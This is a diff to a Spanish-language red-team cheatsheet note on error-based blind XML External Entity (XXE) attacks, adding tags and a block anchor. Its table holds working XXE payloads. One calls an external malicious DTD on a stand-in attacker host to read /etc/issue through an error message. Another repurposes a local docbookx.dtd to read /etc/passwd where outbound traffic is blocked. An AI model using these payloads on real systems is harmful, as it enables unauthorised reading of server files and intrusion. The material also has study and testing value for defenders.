@@ -2,11 +2,18 @@
 aliases:
 tags:
   - type/cheatsheet
+  - vuln/xxe
+  - technique/execution
+  - asset/web-app
 primary categories:
+  - "[[Red Team]]"
 secondary categories:
+  - "[[Explotación]]"
 tertiary categories:
+  - "[[Explotación Web]]"
 type: CheatSheet
 linked:
+  - "[[XML External Entity (XXE)]]"
 ---
 # XXE - Blind Basado en Errores
 
@@ -18,6 +25,8 @@ linked:
 | -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
 | **Forzar Error con DTD Externo**             | El servidor permite peticiones salientes pero no la exfiltración directa de datos. Alojo un DTD malicioso en mi infraestructura. El payload XML inyectado invoca este DTD, el cual lee el archivo y provoca el error al evaluar la ruta dinámica.                                    | **XML inyectado:**<br>`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://mi-servidor.com/malicioso.dtd"> %xxe;]><foo/>`<br><br>**malicioso.dtd:**<br>`<!ENTITY % file SYSTEM "file:///etc/issue">`<br>`<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///inexistente/%file;'>">`<br>`%eval;`<br>`%error;`                                                                            |
 | **Forzar Error con DTD Local (Total Blind)** | El firewall bloquea absolutamente cualquier conexión saliente. Para evadir esto, busco un archivo DTD legítimo que ya exista en el sistema de archivos del servidor (ej. dependencias de GNOME, docbook) y redefino sus entidades para ejecutar mi carga útil generadora de errores. | **XML inyectado:**<br>`<!DOCTYPE foo [`<br>`<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">`<br>`<!ENTITY % ISOamso '`<br>`<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">`<br>`<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///inexistente/&#x25;file;&#x27;>">`<br>`&#x25;eval;`<br>`&#x25;error;`<br>`'>`<br>`%local_dtd;]><foo/>` |
+
+^xxe-blind-errores
 
 ## Consideraciones de Explotación
 
